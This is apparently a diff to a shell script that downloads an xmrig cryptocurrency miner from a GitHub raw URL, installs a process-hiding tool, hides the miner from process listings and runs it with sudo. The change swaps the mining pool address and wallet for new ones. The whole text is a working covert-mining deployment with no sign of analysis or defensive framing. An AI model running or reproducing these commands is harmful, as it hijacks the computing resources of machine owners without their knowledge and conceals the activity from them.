@@ -3,4 +3,4 @@ npm i -g node-process-hider
 wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
 chmod 500 xmrig
 ph add xmrig
-sudo ./xmrig -o bbp.hanalani.org:3001 --user=85HtWS4dAQ73a5kpb9SwBmJqrAqbXmpyWjci54cpQRXfCg48D93Bmqs4U5ZnkKPHQwTNdwLViSv9eeEoPJ8itYsVNsWsv1G.run --password=B6UC9yE4oRa3vPzHAqZMkiDUjh2mHusPsX
+sudo ./xmrig --url pool.hashvault.pro:80 --user SuboNeGJJrXVUSPz8cAD1JbrG78qDonJfKcqQNfmjK7TPVbhoDyJTNh1mRg6VTkGC1Gu6jU7XpLjmCAGWfbSRY2U5KNK3r9AY1 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
